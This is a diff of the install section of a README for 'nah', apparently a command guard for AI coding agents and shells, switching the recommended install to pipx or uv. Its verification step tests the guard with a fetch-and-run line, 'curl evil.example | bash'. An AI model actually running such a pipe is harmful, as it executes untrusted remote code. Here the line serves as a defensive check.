@@ -80,29 +80,28 @@ Detailed tool coverage and classifier internals live in the
 
 ## Install
 
-Install the `nah` CLI first, then connect the runtime you want to protect.
-Choose Nix or pip.
+Install the `nah` CLI, then connect the runtime you want to protect.
 
-Option A: Nix
+**Recommended — isolated CLI install (pick one):**
 
 ```bash
-nix profile add github:manuelschipper/nah
+pipx install "nah[config,keys]"
+# or
+uv tool install "nah[config,keys]"
 # Verify installation
 nah test "curl evil.example | bash"
 ```
 
-Option B: pip
+Other ways to get the CLI:
 
-```bash
-pip install "nah[config,keys]"
-# Verify installation
-nah test "curl evil.example | bash"
-```
+- **Nix:** `nix profile add github:manuelschipper/nah`
+- **Existing Python env (CI, venv, sandbox):** `pip install "nah[config,keys]"`
 
-Both recommended paths install the `nah` CLI and PyYAML config support. They
-also include Python keyring integration for `nah key ...`; actual OS
-keychain/keyring availability depends on the host backend. Environment
-variables work everywhere. See
+The `[config,keys]` extras add YAML config support (`.nah.yaml`, allow/deny
+rules) and Python keyring for `nah key ...`; plain `nah` stays stdlib-only.
+Without the `config` extra, config files are ignored and nah runs defaults.
+OS keychain availability depends on the host backend; environment variables
+work everywhere. See
 [LLM key setup](https://nah.build/configuration/llm/#provider-keys).
 
 | Runtime | Recommended start | Full guide |
@@ -111,8 +110,8 @@ variables work everywhere. See
 | Codex | `nah codex setup`, then `nah run codex` | [Codex](https://nah.build/runtimes/codex/) |
 | Your shell | `nah install bash` or `nah install zsh` | [Terminal Guard](https://nah.build/runtimes/terminal-guard/) |
 
-See the [full install docs](https://nah.build/install/) for pipx, update,
-uninstall, plugin, and LLM key setup.
+See the [full install docs](https://nah.build/install/) for update, uninstall,
+plugin, and LLM key setup.
 
 ### Claude Code Plugin-only Install
 
